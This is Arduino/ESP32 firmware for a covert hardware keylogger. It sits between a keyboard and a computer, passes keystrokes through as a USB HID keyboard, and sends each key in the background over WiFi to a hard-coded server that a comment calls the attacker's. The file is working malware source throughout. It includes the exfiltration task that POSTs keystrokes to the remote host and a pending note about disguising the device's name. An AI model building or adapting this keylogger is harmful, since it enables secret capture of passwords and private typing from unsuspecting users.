#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <HTTPClient.h>
#include "freertos/queue.h"

USBHIDKeyboard Keyboard;

// Pines UART
#define RX_PIN 18
#define TX_PIN 17
#define BAUD_RATE 9600

// WiFi
const char* ssid     = ""; //Nombre de la red WiFi
const char* password = ""; //Contraseña de la red WiFi

// Servidor local
const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor atacante

// Cambiar el nombre con el que aparece
// Pendiente

// Comandos especiales
#define CMD_ESC        0x1B
#define CMD_TAB        0x09
#define CMD_CAPS       0x14
#define CMD_BACKSPACE  0x08
#define CMD_ENTER      0x0A
#define CMD_GUI        0x90
#define CMD_ALTGR      0x92 // AltGr

typedef struct {
  uint8_t command;
  uint8_t keycode;
} CommandMap;

CommandMap commandMap[] = {
  {CMD_ESC,       KEY_ESC},
  {CMD_TAB,       KEY_TAB},
  {CMD_CAPS,      KEY_CAPS_LOCK},
  {CMD_BACKSPACE, KEY_BACKSPACE},
  {CMD_ENTER,     KEY_RETURN}
};

const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);

// ====== Cola para teclas ======
QueueHandle_t keyQueue;

// ====== Envío en segundo plano ======
void serverTask(void* parameter) {
  String key;
  for (;;) {
    if (xQueueReceive(keyQueue, &key, portMAX_DELAY) == pdTRUE) {
      if (WiFi.status() == WL_CONNECTED) {
        HTTPClient http;
        http.setTimeout(1000);  // 1s máximo
        if (http.begin(serverURL)) {
          http.addHeader("Content-Type", "application/json");
          String json = "{\"key\":\"" + key + "\"}";
          http.POST(json);
          http.end();
        }
      }
    }
  }
}

// ====== HID ======
void pressAndRelease(uint8_t key) {
  Keyboard.press(key);
  Keyboard.release(key);
}

void sendLater(const String& key) {
  xQueueSend(keyQueue, &key, 0); // no bloquea, si la cola está llena se descarta
}

bool isSpecialCommand(uint8_t cmd) {
  if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) return true;
  }
  return false;
}

void handleSpecialCommand(uint8_t cmd) {
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) {
      pressAndRelease(commandMap[i].keycode);
      sendLater(String(commandMap[i].keycode)); 
      return;
    }
  }
  if (cmd == CMD_GUI) {
    pressAndRelease(KEY_LEFT_GUI);
    sendLater("GUI");
  }
  if (cmd == CMD_ALTGR) {
    pressAndRelease(KEY_RIGHT_ALT);
    sendLater("ALTGR");
  }
}

// ====== Setup ======
void setup() {
  Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
  USB.begin();
  Keyboard.begin();
  delay(500);
  Serial1.println("Receptor listo");

  // WiFi con timeout
  WiFi.begin(ssid, password);
  Serial1.print("Conectando a WiFi");
  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    Serial1.print(".");
    retries++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial1.println("\nConectado a WiFi");
    Serial1.print("IP: ");
    Serial1.println(WiFi.localIP());
  } else {
    Serial1.println("\nModo offline (sin WiFi)");
  }

  // Crear cola y tarea para envíos
  keyQueue = xQueueCreate(32, sizeof(String));
  xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
}

// ====== Loop ======
void loop() {
  if (Serial1.available()) {
    uint8_t c = Serial1.read();

    if (isSpecialCommand(c)) {
      handleSpecialCommand(c);
    } else {
      // Caracteres imprimibles
      if (c >= 0x20 && c <= 0x7E) {
        // Caso especial para '@' en teclado ES-LA
        if (c == '@') {
          Keyboard.press(KEY_RIGHT_ALT);  
          Keyboard.press('q');            
          Keyboard.release('q');
          Keyboard.release(KEY_RIGHT_ALT);

          sendLater("@");
        } else {
          Keyboard.write((char)c);
          sendLater(String((char)c));
        }
      }
    }
  }
}
